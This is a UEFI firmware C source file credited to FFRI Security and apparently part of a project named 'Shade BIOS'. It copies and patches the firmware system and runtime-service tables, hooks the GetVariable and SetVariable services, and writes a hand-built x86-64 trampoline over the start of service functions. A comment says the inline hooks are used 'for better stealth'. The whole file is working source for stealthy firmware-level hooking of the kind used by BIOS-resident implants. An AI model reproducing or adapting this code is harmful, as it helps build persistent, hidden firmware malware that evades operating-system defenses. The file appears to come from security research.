/*
 * (c) FFRI Security, Inc., 2025 / Author: FFRI Security, Inc.
 */

EFI_RUNTIME_SERVICES gRTcopyPhy;
EFI_RUNTIME_SERVICES gRTcopyVir;
EFI_BOOT_SERVICES    gBScopy;
EFI_SYSTEM_TABLE     gSTcopy;

EFI_GET_VARIABLE gOrigGetVariableHookRT;
/**

  Deal with GetVariable for the runtime variable with "_RT" created by SetVariableHookRT

**/
EFI_STATUS
EFIAPI
__attribute__((noinline))
GetVariableHookRT(
    IN      CHAR16    *VariableName,
    IN      EFI_GUID  *VendorGuid,
    OUT     UINT32    *Attributes,
    IN OUT  UINTN     *DataSize,
    OUT     VOID      *Data
    )
{
  EFI_STATUS Status = gOrigGetVariableHookRT(VariableName, VendorGuid, Attributes, DataSize, Data);
  if(Status!=EFI_SUCCESS && Status!=EFI_BUFFER_TOO_SMALL) {
    CHAR16 *NewVarName;
    UINTN NewVarSize = (StrLen(VariableName)+3+1)*sizeof(CHAR16);
    gBS->AllocatePool(
        EfiRuntimeServicesData,
        NewVarSize,
        (VOID**)&NewVarName
        );
    StrCpyS(NewVarName, NewVarSize, VariableName);
    StrCatS(NewVarName, NewVarSize, L"_RT");

    EFI_STATUS Status2 = gOrigGetVariableHookRT(NewVarName, VendorGuid, Attributes, DataSize, Data);
    if(Status2==EFI_SUCCESS || Status2==EFI_BUFFER_TOO_SMALL) {
      gBS->FreePool(NewVarName);
      return Status2;
    }
    gBS->FreePool(NewVarName);
  }
  return Status;
}


    
EFI_SET_VARIABLE gOrigSetVariableHookRT;
/**

  Store variable with no EFI_VARIABLE_RUNTIME_ACCESS attributes to other runtime variable
    * Append "_RT" to the original VariableName and store it with RT attr

**/
EFI_STATUS
EFIAPI
__attribute__((noinline))
SetVariableHookRT(
    IN  CHAR16    *VariableName,
    IN  EFI_GUID  *VendorGuid,
    IN  UINT32    Attributes,
    IN  UINTN     DataSize,
    IN  VOID      *Data
    )
{
  if((Attributes&EFI_VARIABLE_RUNTIME_ACCESS) == 0) {
    CHAR16 *NewVarName;
    UINTN NewVarSize = (StrLen(VariableName)+3+1)*sizeof(CHAR16);
    gBS->AllocatePool(
        EfiRuntimeServicesData,
        NewVarSize,
        (VOID**)&NewVarName
        );
    StrCpyS(NewVarName, NewVarSize, VariableName);
    StrCatS(NewVarName, NewVarSize, L"_RT");

    Attributes |= EFI_VARIABLE_RUNTIME_ACCESS;
    EFI_STATUS Status = gOrigSetVariableHookRT(NewVarName, VendorGuid, Attributes, DataSize, Data);
    gBS->FreePool(NewVarName);
    return Status;
  }

  return gOrigSetVariableHookRT(VariableName, VendorGuid, Attributes, DataSize, Data);
}


    
BOOLEAN gRTModDone = FALSE;
/**

  Modify RT to customize gRT functions to work at runtime
   * **This must modify copied runtime service to avoid conflict from hooks towards original gRT**
   * SetVariable: Set with no EFI_VARIABLE_RUNTIME_ACCESS fails at runtime so store it in other runtime variable
   * GetVariable: Allow GetVaraible for above variable

**/
VOID
EFIAPI
ModifyRT(
    EFI_RUNTIME_SERVICES *RT
    )
{
  if(gRTModDone) {
    return;
  }

  gOrigSetVariableHookRT = RT->SetVariable;
  RT->SetVariable = SetVariableHookRT;
  gOrigGetVariableHookRT = RT->GetVariable;
  RT->GetVariable = GetVariableHookRT;
  gRTModDone = TRUE;
}



/**

  Convert to modified version of RT

**/
VOID
RTVirToPhy(
    )
{
  CopyMem(&gRTcopyVir, gRT, sizeof(EFI_RUNTIME_SERVICES));
  ModifyRT(&gRTcopyPhy);
  CopyMem(gRT, &gRTcopyPhy, sizeof(EFI_RUNTIME_SERVICES));
}



/**

  Restore gRT

**/
VOID
RTPhyToVir(
    )
{
  CopyMem(gRT, &gRTcopyVir, sizeof(EFI_RUNTIME_SERVICES));
}



/**

  Restore gBS & gST
    * Some members are lost after OS boot

**/
VOID
RestoreBsSt(
    )
{
  // Restore gBS
  CopyMem(gBS, &gBScopy, sizeof(EFI_BOOT_SERVICES));
  // Restore gST
  CopyMem(gST, &gSTcopy, sizeof(EFI_SYSTEM_TABLE));
}



/**

  Save gST, gBS, gRT for restoring at runtime

**/
VOID
SaveStBsRt(
    )
{
  CopyMem(&gRTcopyPhy, gRT, sizeof(EFI_RUNTIME_SERVICES));
  CopyMem(&gBScopy, gBS, sizeof(EFI_BOOT_SERVICES));
  CopyMem(&gSTcopy, gST, sizeof(EFI_SYSTEM_TABLE));
}



//////////////////////////////////////////////////////////////////////////
///
/// Shade BIOS currently hooks gRT/gBS table directly but,
/// use inline hooks for better stealth.
///
//////////////////////////////////////////////////////////////////////////

#define TRAMPOLINE_SIZE 0x22
/*
 *BYTE trampoline[TRAMPOLINE_SIZE] = {
 *  0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, <addr>
 *  0xFF, 0xe0                                                  // jmp rax
 *};
 */
BYTE trampoline[TRAMPOLINE_SIZE] = {
  0x48, 0x89, 0xe0,                                            //  mov    rax,rsp
  0x48, 0xc1, 0xe8, 0x20,                                      //  shr    rax,0x20
  0x48, 0x85, 0xc0,                                            //  test   rax,rax  ; Check if rsp is vir addr
  0x74, 0x0a,                                                  //  je     <phy>
  0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  //  movabs rax,<VirHookAddr>
	                                                             // phy:
  0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  //  movabs rax,<PhyHookAddr>
	                                                             // jump:
  0xff, 0xe0                                                   //  jmp    rax      ; call HookAddr
};
BOOLEAN gIsVirtualized = FALSE;
VOID
EFIAPI
HookServices(
    IN      PVOID  ServiceAddr,
    IN      PVOID  HookFuncAddr,
    IN OUT  PVOID  OrigCode
    )
{
  if(gIsVirtualized) {
    CopyMem(&trampoline[14], &HookFuncAddr, sizeof(UINTN));
  }
  else {
    CopyMem(&trampoline[24], &HookFuncAddr, sizeof(UINTN));
  }
  CopyMem((PVOID)OrigCode, (PVOID)ServiceAddr, TRAMPOLINE_SIZE);
  CopyMem((PVOID)ServiceAddr, (PVOID)trampoline, TRAMPOLINE_SIZE);
}


VOID
RestoreService(
    IN      PVOID  ServiceAddr,
    IN OUT  PVOID  OrigCode
    )
{
  CopyMem(ServiceAddr, OrigCode, TRAMPOLINE_SIZE);
}


VOID
ConvertHookService(
    IN      PVOID  ServiceAddr,
    IN      PVOID  HookFuncAddr,
    IN OUT  PVOID  OrigCode
    )
{
  RestoreService(ServiceAddr, OrigCode);
  PVOID ServiceHookVirAddr = (PVOID)HookFuncAddr;
  gRT->ConvertPointer(0, (VOID**)&ServiceHookVirAddr);
  gIsVirtualized = TRUE;
  HookServices(ServiceAddr, ServiceHookVirAddr, OrigCode);
  gRT->ConvertPointer(0, (VOID**)&ServiceAddr);
  gRT->ConvertPointer(0, (VOID**)&OrigCode);
}
